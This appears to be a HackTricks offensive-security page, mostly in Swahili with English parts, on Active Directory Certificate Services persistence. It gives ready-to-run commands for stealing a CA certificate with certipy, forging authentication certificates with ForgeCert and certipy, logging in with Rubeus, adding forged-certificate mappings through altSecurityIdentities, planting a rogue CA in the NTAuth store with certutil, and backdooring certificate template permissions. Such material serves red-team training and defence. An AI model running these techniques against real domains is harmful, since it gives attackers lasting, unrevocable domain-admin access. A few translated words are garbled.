# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Huu ni muhtasari wa mbinu za domain persistence zilizoshirikiwa katika [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Angalia kwa maelezo zaidi.

## Forging Certificates with Stolen CA Certificates - DPERSIST1

How can you tell that a certificate is a CA certificate?

Inaweza kubainika kwamba certificate ni certificate ya CA ikiwa masharti kadhaa yamekidhiwa:

- The certificate is stored on the CA server, with its private key secured by the machine's DPAPI, or by hardware such as a TPM/HSM if the operating system supports it.
- Both the Issuer and Subject fields of the certificate match the distinguished name of the CA.
- A "CA Version" extension is present in the CA certificates exclusively.
- The certificate lacks Extended Key Usage (EKU) fields.

Ili kutoa private key ya certificate hii, zana certsrv.msc kwenye server ya CA ndiyo njia inayotumiwa kupitia GUI iliyojengwa. Hata hivyo, certificate hii haijatofautiana na zile nyingine zilizo kwenye mfumo; kwa hivyo, mbinu kama [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) zinaweza kutumika kwa ajili ya uondoaji.

The certificate and private key can also be obtained using Certipy with the following command:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Baada ya kupata cheti cha CA na ufunguo wake wa siri katika muundo wa `.pfx`, zana kama [ForgeCert](https://github.com/GhostPack/ForgeCert) zinaweza kutumika kutengeneza vyeti halali:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Mtumiaji aliyechaguliwa kwa udanganyifu wa cheti lazima awe hai na awe na uwezo wa kuthibitisha utambulisho katika Active Directory ili mchakato ufanikiwe. Kutengeneza cheti kwa akaunti maalum kama krbtgt haifai.

Cheti kilichofungwa hiki kitatumika **hadi tarehe ya mwisho** iliyotajwa na kwa **muda ambao cheti cha root CA kitakavyokuwa halali** (kawaida kutoka miaka 5 hadi **10+ years**). Pia kinatumika kwa **mashine**, hivyo ukichanganywa na **S4U2Self**, mshambuliaji anaweza **kutunza udumu kwenye mashine yoyote ya domain** kwa muda wote cheti cha CA kitakachokuwa halali.\  
Zaidi ya hayo, **vyeti vinavyotengenezwa** kwa njia hii **haviwezi kukataliwa** kwa sababu CA haijui kuhusu hivyo.

### Kufanya kazi chini ya utekelezaji mkali wa ramani za vyeti (2025+)

Tangu February 11, 2025 (baada ya kuenezwa kwa KB5014754), domain controllers kwa chaguo-msingi zimeweka **Full Enforcement** kwa certificate mappings. Kivitendo hili linamaanisha vyeti vyako vya uongo lazima vitokee kwa mojawapo ya:

- Kuwa na uhusiano thabiti na akaunti lengwa (kwa mfano, extension ya usalama ya SID), au
- Kuambatanishwa na ramani thabiti, wazi kwenye sifa ya kitu lengwa `altSecurityIdentities`.

Njia ya kuaminika kwa udumu ni kutengeneza cheti bandia kilichounganishwa na Enterprise CA iliyoibwa kisha kuongeza ramani imara, wazi kwenye victim principal:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Vidokezo
- If you can craft forged certificates that include the SID security extension, those will map implicitly even under Full Enforcement. Otherwise, prefer explicit strong mappings. See
[account-persistence](account-persistence.md) for more on explicit mappings.
- Revocation haimsaidii watetezi hapa: vyeti bandia havijulikani kwenye hifadhidata ya CA na kwa hivyo haviwezi kukataliwa.

## Kuamini Rogue CA Certificates - DPERSIST2

The `NTAuthCertificates` object is defined to contain one or more **CA certificates** within its `cacertificate` attribute, which Active Directory (AD) utilizes. The verification process by the **domain controller** involves checking the `NTAuthCertificates` object for an entry matching the **CA specified** in the Issuer field of the authenticating **certificate**. Authentication proceeds if a match is found.

A self-signed CA certificate can be added to the `NTAuthCertificates` object by an attacker, provided they have control over this AD object. Normally, only members of the **Enterprise Admin** group, along with **Domain Admins** or **Administrators** in the **forest root’s domain**, are granted permission to modify this object. They can edit the `NTAuthCertificates` object using `certutil.exe` with the command `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, or by employing the [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Additional helpful commands for this technique:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Uwezo huu una umuhimu hasa inapochanganywa na mbinu iliyotajwa hapo awali inayotumia ForgeCert kuunda vyeti kwa wakati wa utekelezaji.

> Mambo ya kuzingatia baada ya 2025 kuhusu ulinganishaji: kuweka CA ya kivurugo kwenye NTAuth kunaunda tu uaminifu kwa CA inayotolewa. Ili kutumia vyeti vya leaf kwa kuingia wakati DCs ziko katika **Full Enforcement**, leaf lazima iwe na rozsion ya usalama ya SID au lazima kuwe na ulinganishaji thabiti wazi kwenye kitu lengwa (kwa mfano, Issuer+Serial katika `altSecurityIdentities`). Angalia {{#ref}}account-persistence.md{{#endref}}.

## Usanidi Mbaya - DPERSIST3

Fursa za **persistence** kupitia **mabadiliko ya security descriptor ya vipengele vya AD CS** ni nyingi. Mabadiliko yaliyoelezwa katika sehemu ya "[Domain Escalation](domain-escalation.md)" yanaweza kutekelezwa kwa ubaya na mshambuliaji mwenye upatikanaji ulioboreshwa. Hii ni pamoja na kuongeza "control rights" (mf., WriteOwner/WriteDACL/etc.) kwa vipengele vitakavyokuwa na hatari kama:

- Objekti la **AD computer** la **CA server**
- **CA server’s RPC/DCOM server**
- Kila **objekti au kituzo cha jirani cha AD** katika **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (kwa mfano, container ya Certificate Templates, container ya Certification Authorities, objektu ya NTAuthCertificates, nk.)
- **AD groups zilizopewa haki za kudhibiti AD CS** kwa default au na shirika (kama group ya built-in Cert Publishers na wanachama wake wote)

Mfano wa utekelezaji mbaya ungehusisha mshambuliaji ambaye ana **idhini iliyoongezwa** katika domain, kuongeza ruhusa ya **`WriteOwner`** kwenye template ya default **`User`**, huku mshambuliaji akiwa ndiye mtendaji wa haki hiyo. Ili kutumia hili, mshambuliaji angebadili umiliki wa template ya **`User`** kuwa wao wenyewe. Baada ya hapo, `mspki-certificate-name-flag` ingetengwa kuwa **1** kwenye template ili kuwezesha **`ENROLLEE_SUPPLIES_SUBJECT`**, kuruhusu mtumiaji kutoa Subject Alternative Name katika ombi. Ifuatayo, mshambuliaji angeweza **kuiandika** kwa kutumia **template**, akichagua jina la **domain administrator** kama jina mbadala, na kutumia cheti alichopata kwa uthibitishaji kama DA.

Maboresho ya vitendo ambayo mashambulizi yanaweza kuweka kwa persistence ya muda mrefu katika domain (tazama {{#ref}}domain-escalation.md{{#endref}} kwa maelezo kamili na utambuzi):

- Bendera za sera za CA zinazoruhusu SAN kutoka kwa waombaji (mf., kuwezesha `EDITF_ATTRIBUTESUBJECTALTNAME2`). Hii inahifadhi njia za aina ya ESC1 ziwe za kutumika.
- DACL ya template au mipangilio inayoruhusu utoaji unaouwezesha uthibitishaji (mf., kuongeza Client Authentication EKU, kuwezesha `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Kudhibiti objektu ya `NTAuthCertificates` au containers za CA ili kuendelea kuingiza tena watoleaji wa kivurugo ikiwa watetezi watajaribu kusafisha.

> [!TIP]
> Katika mazingira yaliyoimarishwa baada ya KB5014754, kupanganya misconfigurations hizi na ulinganishaji thabiti wazi (`altSecurityIdentities`) kunahakikisha vyeti ulivyovituma au vilivyofanywa kwa udukuzi vinaendelea kutumika hata wakati DCs zinapoiga ulinganishaji thabiti.

## References

- Microsoft KB5014754 – Mabadiliko ya uthibitishaji unaotegemea vyeti kwenye Windows domain controllers (muda wa utekelezaji na ulinganifu thabiti). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
{{#include ../../../banners/hacktricks-training.md}}
